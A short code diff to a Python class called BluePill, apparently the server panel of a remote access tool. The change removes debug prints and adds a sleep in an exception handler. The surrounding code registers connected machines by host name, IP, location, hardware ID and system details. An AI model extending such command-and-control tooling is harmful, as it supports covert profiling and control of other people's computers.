@@ -39,9 +39,7 @@ class BluePill:
                     self.my_window.process_manager.append(None)
                     self.send(b'BluePillv1.0', conn)
                     tcp_data = self.recv(conn)
-                    print(tcp_data)
                     data = json.loads(tcp_data)
-                    print(data)
                     host = data['SYSINFO']['Host Name']
                     ip = data['LOCATION']['ip']
                     country = data['LOCATION']['country']
@@ -50,13 +48,12 @@ class BluePill:
                     os_version = data['SYSINFO']['OS Version']
                     cpu_name = data['CPU']
                     gpu_name = data['GPU']
-                    print(data['DISPLAY'])
-                    print(type(data['DISPLAY']))
                     self.my_window.display_info.append(data['DISPLAY'])
                     self.my_window.add_new_data(host, ip, str(addr[1]), hwid, country, os_name, os_version, cpu_name, gpu_name)
                     self.start(self.my_window.last_used_id, conn)
             except:
-                pass
+                time.sleep(0.1)
+
 
     def delete_item(self, item_id):
         row_index = -1
